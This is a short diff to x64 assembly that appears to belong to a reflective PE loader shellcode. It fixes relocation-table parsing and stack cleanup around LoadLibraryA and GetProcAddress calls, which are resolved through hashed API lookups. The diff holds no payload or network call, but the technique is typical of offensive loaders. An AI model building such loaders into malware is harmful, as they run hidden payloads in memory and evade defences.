@@ -39,15 +39,18 @@ start:								;
 	mov rdi,rax						; Save the new base address to rdi
 
 ;#- relocate.asm -------------------------------
+; RSI = &PE
 ; RCX = &end_of_base_realocation_table
 ; RDX = base_relocation_delta
 ; R8 = Reloc block descriptor
 ; R13D = Reloc block RVA
 ; R14D = Reloc block table size
 ;
+	xor rax,rax
 	xor r8,r8                       ; Zero out the r8
 	xor r13,r13
 	xor r14,r14	
+	mov eax,dword [rsi+0x3C]        ; Offset to IMAGE_NT_HEADER ("PE")
 	mov ecx,dword [rax+rsi+0xB4]	; Base relocation table size
 	mov eax,dword [rax+rsi+0xB0]  	; Base relocation table RVA
 	add rax,rsi             		; Base relocation table memory address
@@ -140,8 +143,7 @@ LoadLibraryA:
 	mov rcx,rax                 ; Move the address of library name string to RCX
 	mov r10d,0x0726774C         ; hash( "kernel32.dll", "LoadLibraryA" )
 	call rbp                    ; LoadLibraryA([esp+4])
-	pop rcx                     ; Fix the stack
-	pop rcx                     ; ...
+	add rsp,32                  ; Fix the stack
 	pop rcx                     ; Retreive ecx
 	ret                         ; <-
 GetProcAddress:
@@ -149,7 +151,7 @@ GetProcAddress:
 	mov rdx,rax                 ; Move the address of function name string to RDX as second parameter
 	mov r10d,0x7802F749         ; hash( "kernel32.dll", "GetProcAddress" )
 	call rbp                    ; GetProcAddress(ebx,[esp+4])
-	pop rcx                     ; Retrieve ecx
+	add rsp,24                  ; Fix the stack
 	pop rcx                     ; ...
 	ret                         ; <-
 complete:
